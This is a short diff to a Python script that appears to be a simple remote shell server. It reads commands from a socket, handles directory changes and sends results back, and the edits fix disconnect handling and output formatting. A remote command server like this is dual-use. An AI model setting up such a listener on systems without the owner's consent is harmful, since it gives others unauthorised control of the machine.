@@ -25,6 +25,9 @@ while True:
     while True:
         data = conn.recv(1024)
 
+        if data == b"":
+            break
+
         command = data.decode().strip()
 
         if command.startswith("cd "):
@@ -32,7 +35,7 @@ while True:
                 path = command[3:].strip()
                 os.chdir(path)
                 current_dir = os.getcwd()
-                r = f"Changed to dir {current_dir}".encode()
+                r = f"Changed to dir {current_dir}\n".encode()
             except Exception as e:
                 r = str(e).encode()
         else:
@@ -48,5 +51,4 @@ while True:
                 r = str(e).encode()
 
         conn.sendall(r)
-
     conn.close()
